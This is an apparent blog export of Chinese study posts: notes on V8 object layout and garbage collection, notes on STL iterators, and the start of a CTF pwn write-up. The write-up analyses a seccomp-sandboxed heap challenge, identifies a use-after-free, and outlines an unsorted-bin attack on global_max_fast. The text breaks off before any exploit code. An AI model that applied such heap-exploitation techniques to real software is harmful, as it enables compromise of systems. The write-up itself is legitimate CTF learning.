__lookupGetter__ (sfi = 0xde2a0e461d1)&gt; (const data field 4) properties[0]</span><br><span class="line">    #__lookupSetter__: 0x279242543041 &lt;JSFunction __lookupSetter__ (sfi = 0xde2a0e46229)&gt; (const data field 5) properties[1]</span><br><span class="line">    #isPrototypeOf: 0x279242543079 &lt;JSFunction isPrototypeOf (sfi = 0xde2a0e46281)&gt; (const data field 6) properties[2]</span><br><span class="line">    #propertyIsEnumerable: 0x2792425430b1 &lt;JSFunction propertyIsEnumerable (sfi = 0xde2a0e462d9)&gt; (const data field 7) properties[3]</span><br><span class="line">    #toString: 0x2792425430e9 &lt;JSFunction toString (sfi = 0xde2a0e46339)&gt; (const data field 8) properties[4]</span><br><span class="line">    #valueOf: 0x279242543121 &lt;JSFunction valueOf (sfi = 0xde2a0e46371)&gt; (const data field 9) properties[5]</span><br><span class="line">    #__proto__: 0x279242542f29 &lt;AccessorPair&gt; (const accessor descriptor)</span><br><span class="line">    #toLocaleString: 0x279242543159 &lt;JSFunction toLocaleString (sfi = 0xde2a0e46459)&gt; (const data field 10) properties[6]</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>对于数组，它是这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x7731050f121: [JSArray]</span><br><span class="line"> - map: 0x2b3af1082d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x28c976451111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x07731050f0a1 &lt;FixedArray[5]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 5</span><br><span class="line"> - properties: 0x362609780c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3453a79001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x07731050f0a1 &lt;FixedArray[5]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 4</span><br><span class="line">           4: 5</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>看一下Elements，发现是数组的成员</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; job 0x07731050f0a1</span><br><span class="line">0x7731050f0a1: [FixedArray]</span><br><span class="line"> - map: 0x362609780851 &lt;Map&gt;</span><br><span class="line"> - length: 5</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 4</span><br><span class="line">           4: 5</span><br></pre></td></tr></table></figure>

<p>定义对象的时候，如<code>var obj={a:1}</code>，实际上会调用a的<code>toString</code>函数，将a转换成’a’，然后当作属性名</p>
<p>而数组就是以一系列非负连续整数命名的对象</p>
<p>对于大型的对象类型的数组，v8会使用哈希表来存储</p>
<h2 id="In-object-slack-tracking"><a href="#In-object-slack-tracking" class="headerlink" title="In-object slack tracking"></a>In-object slack tracking</h2><p>v8是怎么知道改为一个对象留多少空间的呢，毕竟我们不希望它频繁地realloc，也不希望为一个小的对象取分配一个大的内存</p>
<p>v8使用了名为In-object slack tracking的过程来查明每个构造函数的实例的适当大小</p>
<p>最初，构造函数分配的对象有大量内存。一旦从同一构造函数中分配了一定数量的对象（，V8通过从初始map遍历过渡树来检查这些初始对象的最大大小。新的对象被分配有足够的内存来存储这个最大数量的属性。最初的对象也使用一个巧妙的技巧调整大小。第一次分配初始对象时，它们的字段将被初始化，以便垃圾收集器认为它们是可用空间。垃圾收集器实际上并不将它们视为可用空间，因为map指定了对象的大小。但是，当In-object slack tracking过程结束时，新的实例大小会写入转换树中的map，因此具有这些map的对象实际上会变小。由于未使用的字段看起来已经像可用空间，因此不需要修改初始对象。</p>
<h2 id="Methods-and-Prototypes"><a href="#Methods-and-Prototypes" class="headerlink" title="Methods and Prototypes"></a>Methods and Prototypes</h2><p>js没有类，但是它可以用如下的方式来做到类似类的效果</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.x = x;</span><br><span class="line">    <span class="keyword">this</span>.y = y;</span><br><span class="line">    <span class="keyword">this</span>.xplusy = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> x + y;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Point(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">p.xplusy();</span><br></pre></td></tr></table></figure>

<p>这是用了匿名函数，如果把xplusy函数当作普通的对象内的字段的话，它会浪费许多的空间，因为每个对象都要花费一些空间来指向相同的东西。</p>
<p>为了避免空间的浪费，js实现了类似于c++的虚表的技术，它用maps来当作虚表</p>
<p>js还提供了共享字段的另一种方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.x = x;</span><br><span class="line">    <span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Point.prototype.xplusy = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>.x + <span class="keyword">this</span>.y&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>根据规范，js中的所有数字都是64位浮点数，v8中使用31位有符号整数来表示数字，这将有助于垃圾回收器区分数字和指针</p>
<p>如果索引值超过了数组的最大长度，数组会以字典模式来将其存取</p>
<p>如果要赋值数组，应当避免从后往前赋值，因为这几乎肯定会触发字典模式（为什么？）</p>
<p>因为命名属性和元素是分开存储的，所以即使对象进入数组的字典模式，命名属性已经可以快速地访问</p>
<h1 id="垃圾回收器"><a href="#垃圾回收器" class="headerlink" title="垃圾回收器"></a>垃圾回收器</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>垃圾回收器要解决的根本问题是如何找到“死”的区域。一旦识别出死的区域，这些区域就会被重新使用或者返还给操作系统。当一个对象被根对象或者其他存活的对象所引用的话，它就是活的。根对象被定义为活的，他们是一些被v8或者浏览器直接引用的对象。全局对象是根对象，因为他们总是可访问的。浏览器的对象，例如DOM元素，也是根对象，尽管他们有时候只是被弱引用了。</p>
<h2 id="堆组织"><a href="#堆组织" class="headerlink" title="堆组织"></a>堆组织</h2><p>v8的堆由一系列区域组成</p>
<ul>
<li>New-space: Most objects are allocated here. New-space is small and is designed to be garbage collected very quickly, independent of other spaces.</li>
<li>Old-pointer-space: Contains most objects which may have pointers to other objects. Most objects are moved here after surviving in new-space for a while.</li>
<li>Old-data-space: Contains objects which just contain raw data (no pointers to other objects). Strings, boxed numbers, and arrays of unboxed doubles are moved here after surviving in new-space for a while.</li>
<li>Large-object-space: This space contains objects which are larger than the size limits of other spaces. Each object gets its own mmap’d region of memory. Large objects are never moved by the garbage collector.</li>
<li>Code-space: Code objects, which contain JITed instructions, are allocated here. This is the only space with executable memory (although Codes may be allocated in large-object-space, and those are executable, too).</li>
<li>Cell-space, property-cell-space and map-space: These spaces contain Cells, PropertyCells, and Maps, respectively. Each of these spaces contains objects which are all the same size and has some constraints on what kind of objects they point to, which simplifies collection.</li>
</ul>
<p>每个空间都由一组页组成，通过mmap从操作系统分配。页是内存中连续的内存块，它的大小适中为1MB，且始终以1MB对齐。但在Large-object-space中，页可能会更大</p>
<p>为了存储对象，页包含了一个头部（由各种flag和元数据）和一个标志位图（用来表明哪个对象是活的）</p>
<p>每页都有一个槽缓冲，分配在独立的内存中，形成了一个对象列表，可以指向页上存储的对象，这通常被称为记忆集</p>
<h2 id="发现指针"><a href="#发现指针" class="headerlink" title="发现指针"></a>发现指针</h2><p>v8采用标记指针的方法来区分数据和指针，指针的最末位必定为1，而数据的最末位必定为0</p>
<h2 id="分代回收"><a href="#分代回收" class="headerlink" title="分代回收"></a>分代回收</h2><p>在绝大多数程序中，大部分对象的存活时间比较短，小部分对象的存活时间则更长</p>
<p>为了利用这种现象，v8将堆分为两代，新生代和老生代</p>
<p>新生代的对象为存活时间较短的对象，老生代中的对象为存活时间较长或常驻内存的对象。分别对新生代和老生代使用不同的垃圾回收算法来提升垃圾回收的效率。对象起初都会被分配到新生代，当新生代中的对象满足某些条件（后面会有介绍）时，会被移动到老生代（晋升）</p>
<p>默认情况下，64位环境下的V8引擎的新生代内存大小32MB、老生代内存大小为1400MB，而32位则减半，分别为16MB和700MB。V8内存的最大保留空间分别为1464MB（64位）和732MB（32位）。具体的计算公式是4*reserved_semispace_space_ + max_old_generation_size_，新生代由两块reserved_semispace_space_组成，每块16MB（64位）或8MB（32位）</p>
<h3 id="新生代"><a href="#新生代" class="headerlink" title="新生代"></a>新生代</h3><p>新生代的垃圾回收算法时Scavenge算法，其主要采用了Cheney算法</p>
<p>Cheney算法将新生代空间分为两个“半空间”，一为from空间，一为to空间。分配对象时，先在from空间进行分配。当开始执行垃圾回收算法的时候，先检查from空间对象的存活情况，然后将存活的对象复制到to空间中，而死亡的对象则被直接释放。复制完成后，to空间就变成了from空间，而from空间也就变成了to空间。</p>
<p>这种算法对于新生代来说是极好的，因为新生代很小，且新生代中的绝大多数对象都是非活跃对象，所以其时间效率十分理想。复制的过程采用的是广度优先遍历的思想，从根对象触发，广度优先遍历所有能到达的对象。</p>
<p>很明显它是牺牲空间换取时间的算法</p>
<p>当一个对象进行多次新生代的清理依旧存货，他就会被移动到老生代，这被称为晋升，具体移动的标准有两种：</p>
<ol>
<li>对象从From空间复制到To空间时，会检查它的内存地址来判断这个对象是否已经经历过一个新生代的清理，如果是，则复制到老生代中，否则复制到To空间中</li>
<li>对象从From空间复制到To空间时，如果To空间已经被使用了超过25%，那么这个对象直接被复制到老生代</li>
</ol>
<h3 id="老生代"><a href="#老生代" class="headerlink" title="老生代"></a>老生代</h3><p>老生代所保存的对象大多数是生存周期很长的甚至是常驻内存的对象，而且老生代占用的内存较多</p>
<p>老生代的垃圾回收策略采用Mark-Sweep和Mark-Compact相结合</p>
<h4 id="Mark-Sweep（标记清除）"><a href="#Mark-Sweep（标记清除）" class="headerlink" title="Mark-Sweep（标记清除）"></a>Mark-Sweep（标记清除）</h4><p>标记清除分为标记和清除两个阶段</p>
<p>在标记阶段，它会遍历堆中的对象，并标记存活的对象。每个页都有一个用来标记对象的位图，位图中的每一位对应内存页的一个字。这个位图需要占据一定的空间（32位下为3.1%，64位为1.6%）。另有两位用来标记对象的状态，状态有三种，黑，白，灰。</p>
<ul>
<li>白：表示它未被垃圾回收器发现</li>
<li>灰：表示它已经被垃圾回收器发现，但其邻接对象尚未全部处理</li>
<li>黑：表示它不仅被垃圾回收器发现，其临界对象也被处理完毕</li>
</ul>
<p>其采用深度优先搜索</p>
<p>在清除阶段，它会清楚没有被标记的对象</p>
<p>但是这样会产生很多内存碎片</p>
<h4 id="Mark-Compact（标记整理）"><a href="#Mark-Compact（标记整理）" class="headerlink" title="Mark-Compact（标记整理）"></a>Mark-Compact（标记整理）</h4><p>标记整理会清楚内存碎片所带来的问题，它会整理内存碎片，讲活着的对象向内存的一段移动，移动完成后直接清理掉边界外的内存</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>东西挺多，这几天也就光看了这些东西，看了好几遍，体会比较深</p>
<p>一来，学习了许多思想，这将对我以后开发有所帮助</p>
<p>二来，大概学习了v8的垃圾回收机制，对CTF有帮助</p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title>学习STL原理(1)</title>
    <url>/2019/10/22/%E5%AD%A6%E4%B9%A0STL%E5%8E%9F%E7%90%86-1/</url>
    <content><![CDATA[<p>用了这么久C++，却还不了解其下非常出名的标准模板库(STL)，实在是不该</p>
<p>故，参照《泛型编程与STL》一书，开始学习</p>
<p>说实话，此书在一些名词的翻译上显得云来雾去，但总体还不错</p>
<a id="more"></a>

<h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><p>STL的算法和容器是分开的，新增算法并不需要改变容器</p>
<p>这就意味着，STL的容器必须遵循某种规则，这种规则是被算法所通用的</p>
<p>例如，<code>char*</code>可以是一个容器，其可以使用<code>++ -- ==</code>这样的运算符号，分别有不同的作用，那么对于另一个容器，可能是<code>class a</code>，则同样要支持这些符号</p>
<p>STL的做法是对那些不适用一些运算符号的实例（例如类、结构体）采用重载运算符的方法来使他们支持这些运算</p>
<h1 id="第二章节"><a href="#第二章节" class="headerlink" title="第二章节"></a>第二章节</h1><h2 id="Ranges"><a href="#Ranges" class="headerlink" title="Ranges"></a>Ranges</h2><p>STL中有一个被称为Range的概念，这一概念大致等同于python的range，都表示在两者之间的范围，且左闭右开</p>
<p>同时，Range还具有有效性，即若Range所表示的集合为空集，则该Range无效</p>
<h2 id="模板的使用"><a href="#模板的使用" class="headerlink" title="模板的使用"></a>模板的使用</h2><p>这一节引出了C++的<code>template</code>，其作用类似于Java的泛型，均是想用一种方法来表示全部类型</p>
<p><code>template</code>的用法大致如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">T</span> <span class="title">add</span>(<span class="title">T</span> <span class="title">t</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">return</span> t+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码表示，<code>add</code>函数接收类型为T的参数，将其增1之后返回</p>
<p>这里的T可以为<code>int</code>，<code>double</code>，<code>float</code>，以及其他所有支持<code>+1</code>的类型</p>
<p>例如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">1.1</span>;</span><br><span class="line">    <span class="keyword">double</span> b = add(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lf\n"</span>, b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在讲到链表的时候，链表的节点用的是<code>struct</code>，但是直接重载<code>struct</code>的操作运算符是不被允许的，因此需要对它外覆一个类，然后重载这个类的一系列操作运算符</p>
<h2 id="Concept"><a href="#Concept" class="headerlink" title="Concept"></a>Concept</h2><p>此处开始着重讲解何为Concept</p>
<p>首先，Concept是一组条件，如果说T是Concept c的一个模型，那么T必须满足c的所有条件</p>
<p>其次，Concept可以想象成类型的集合，例如<code>char*, double*, float*</code>等等，如果说T是Concept c的一个模型，那么T必须是c的一个元素</p>
<p>最后，Concept对于算法来说类似于一种规章制度，所有的算法都必须依照这一制度来运行。</p>
<p>基本的Concept包括</p>
<ul>
<li>赋值</li>
<li>复制</li>
<li>默认构造</li>
<li>相等或不等</li>
<li>大于或小于</li>
</ul>
<h2 id="Iterators"><a href="#Iterators" class="headerlink" title="Iterators"></a>Iterators</h2><p>此处开始讲迭代器，即泛型指针，也就是用了<code>template</code>关键字的类或者结构体指针</p>
<p>迭代器需要被一般化，即迭代器需要是Concept的一个模型</p>
<h3 id="Input-Iterators"><a href="#Input-Iterators" class="headerlink" title="Input Iterators"></a>Input Iterators</h3><p>本质上，Input Iterators是一种类似指针的东西，它在谈到iterator range的时候有意义</p>
<p>当它作为C指针的时候，它是可取值的，可跨越尾端的，以及可为<code>NULL</code>的，可跨越尾端的是指，它可以指向数组最后的一个元素的后一个元素</p>
<p>它可以被比较，即比较Iterator1是否等于Iterator2</p>
<p>它可以进行累加动作</p>
<p>最好不要对一个Input Iterator进行赋值</p>
<p>使用Input Iterators的正确方式是使它只单向遍历Range一次</p>
<h3 id="Output-Iterators"><a href="#Output-Iterators" class="headerlink" title="Output Iterators"></a>Output Iterators</h3><p>Output Iterators与Input Iterators类似，当然区别也在名字上体现了出来，即它可以被赋值，但是不能从它取值</p>
<h3 id="Forward-Iterators"><a href="#Forward-Iterators" class="headerlink" title="Forward Iterators"></a>Forward Iterators</h3><p>不同于前两者，它允许同时读和写，其他性质和前两者相同</p>
<h3 id="Bidirectional-Iterators"><a href="#Bidirectional-Iterators" class="headerlink" title="Bidirectional Iterators"></a>Bidirectional Iterators</h3><p>不同于Forward Iterators，它允许进行自减操作，其他性质与Forward Iterators相同</p>
<h3 id="Random-Iterators"><a href="#Random-Iterators" class="headerlink" title="Random Iterators"></a>Random Iterators</h3><p>不同于前者，它允许增n或者减n</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Input Iterator和Output Iterator是限制最多的两个Concepts， 其中一个有只读性，另一个有只写性；两者都支持对某个区间进行向前遍历的行为，而应用于单纯的single-pass算法。</p>
<p>Forward Iterators也支持对某个区间的前向遍历操作，但它支持更一般化的算法。Forward Iterators就像普通的C指针那样可以指向某物</p>
<p>Bidirectional Iterators是Forward Iterators的一个强化，而Random Iterators又是Bidirectional Iterators的强化，所以，Bidirectional Iterators与Random Iterators同样支持向前遍历，以及C指针模式。不同的是他们还提供其他的模式，比如前者允许逆向遍历，后者允许任意距离的跳跃</p>
<p>这些不同的Iterator Concepts提供了泛型算法的法则，限制了迭代器的行为，使用约束来让其更加规则</p>
<hr>
<h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>总的来说，直到看到这里，这本书所讲的内容对我来说并没有太新的东西，让我感到有点新奇的就是Concept和Iterator，我似乎在学习Java的时候接触过类似的知识……</p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>STL</tag>
      </tags>
  </entry>
  <entry>
    <title>巅峰极客2019 pwn writeUp</title>
    <url>/2019/10/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-writeUp/</url>
    <content><![CDATA[<p>巅峰极客的时间恰好和360个人赛重了，就先打了360，结果打完360之后脑袋受不了了……</p>
<p>不过这道题也真挺难的……佩服当场做出的师傅们</p>
<p>所有题目都在：<a href="https://github.com/DayJun/Blogs/tree/master/Articles/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn" target="_blank" rel="noopener">Github</a></p>
<a id="more"></a>

<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &apos;/home/dajun/binary/top_geek/pwn/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<p>保护全开，话说现在的题一般都全开了吧……</p>
<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>经典的菜单题，但是有特殊的地方</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_CA0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rax</span></span><br><span class="line">  FILE *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// esp</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// rt1</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+0h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  v0 = fopen(<span class="string">"/dev/urandom"</span>, <span class="string">"r"</span>);      <span class="comment">//打开了urandom，获取到了文件描述符</span></span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"get random fail"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = v0;</span><br><span class="line">  qword_2020B0 = (__int64)&amp;v0[<span class="number">-1</span>]._unused2[<span class="number">4</span>];  <span class="comment">//把不知道什么给了qword_2020B0</span></span><br><span class="line">  stream = v0;  <span class="comment">//把文件描述符给了全局变量stream</span></span><br><span class="line">  setvbuf(v0, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !fread(&amp;v7, <span class="number">1u</span>LL, <span class="number">8u</span>LL, v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"read random fail"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = (<span class="keyword">void</span> *)(v2 &amp; <span class="number">0xFFFF0000</span>);</span><br><span class="line">  qword_2020B8 = (__int64)mmap(v3, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( v3 != (<span class="keyword">void</span> *)qword_2020B8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"mmap fail!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L) )  <span class="comment">//声明沙箱规则</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Could not start seccomp!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = prctl(<span class="number">22</span>, <span class="number">2L</span>L, &amp;unk_202070);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">-1</span> || (<span class="built_in">puts</span>(<span class="string">"welcome to babyheap!!!"</span>), v6 = __readfsqword(<span class="number">0x28</span>u), result = v6 ^ v8, v6 != v8) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Could not start seccomp2!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目在整个菜单程序开始的时候，做了这么多事情，最主要就是把urandom的文件描述符给了全局变量stream，以及声明了沙箱。</p>
<p>一般看见prctl函数大概就知道，它不让getshell，只能通过orw或者其他类似于数组经济线上的那种方式……</p>
<p>看一下沙箱规则</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x04 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0008</span><br><span class="line"> 0004: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>

<p>很明显了，orw</p>
<h2 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h2><ol>
<li>Add note</li>
<li>Delete note</li>
<li>Show note</li>
<li>Change</li>
<li>Exit</li>
</ol>
<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>在delete函数中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_1000()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rbx</span><br><span class="line">  unsigned __int64 v1; // rax</span><br><span class="line">  void *v2; // rdi</span><br><span class="line"></span><br><span class="line">  v0 = qword_2020B8;</span><br><span class="line">  puts(&quot;input your index:&quot;);</span><br><span class="line">  v1 = sub_E60(&quot;input your index:&quot;);</span><br><span class="line">  if ( v1 &gt; 0xF || (v2 = *(void **)(v0 + 16 * v1 + 8)) == 0LL )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range or note not exist&quot;);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  free(v2);     //漏洞点</span><br><span class="line">  return puts(&quot;note delete success!!!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是，虽然是这么简单的漏洞，它却在add函数以及change函数中给了限制，让漏洞更难被利用</p>
<hr>
<p>在add函数中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( v3 &lt;= <span class="number">0x7F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid size!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">……</span><br><span class="line"></span><br><span class="line">v5 = <span class="built_in">malloc</span>(v3); <span class="comment">//v3是size</span></span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)v5 &lt; qword_2020B0 || (<span class="keyword">unsigned</span> __int64)v5 &gt; qword_2020B0 + <span class="number">0x600</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you are bad"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>它限制堆块大小必须大于0x7f，即不能申请fastbin</p>
<p>同时它又限制申请的堆块不能离0x2020b0这个偏移存的地址相差0x600，而0x2020b0存的是堆块的基地址</p>
<hr>
<p>在change函数中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fread(v3, <span class="number">1u</span>LL, *v2, stream);   <span class="comment">//v3是堆地址，*v2是size</span></span><br></pre></td></tr></table></figure>

<p>它是从stream往堆里读size个数据，stream是urandom的文件描述符，结果就导致根本没法用change这个函数来做什么有用的事情</p>
<h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><p>在我动调的过程中，我发现在内存里早就分配了一个size为0x230的堆块，这个堆块的地址是堆的基地址，<code>_IO_list_all</code>里面存的指针也指向了这个块</p>
<p>这就意味着，该堆块是一个<code>_IO_FILE</code>结构体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x55bda3f43000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 561, </span><br><span class="line">  fd = 0xfbad248b, </span><br><span class="line">  bk = 0x55bda3f43093, </span><br><span class="line">  fd_nextsize = 0x55bda3f43093, </span><br><span class="line">  bk_nextsize = 0x55bda3f43093</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来在队友的帮助下，我终于耗时半天多做出来这道题了……QAQ</p>
<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="利用malloc-consolidate以及unsorted-attack来覆盖global-max-fast"><a href="#利用malloc-consolidate以及unsorted-attack来覆盖global-max-fast" class="headerlink" title="利用malloc_consolidate以及unsorted attack来覆盖global_max_fast"></a>利用malloc_consolidate以及unsorted attack来覆盖global_max_fast</h2><p>申请如下格式的块</p>
<table>
<thead>
<tr>
<th align="center">idx</th>
<th align="center">size</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td align="center">0x90</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">0x90</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">0x90</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">0x90</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">0xf0</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">0xf0</td>
</tr>
</tbody></table>
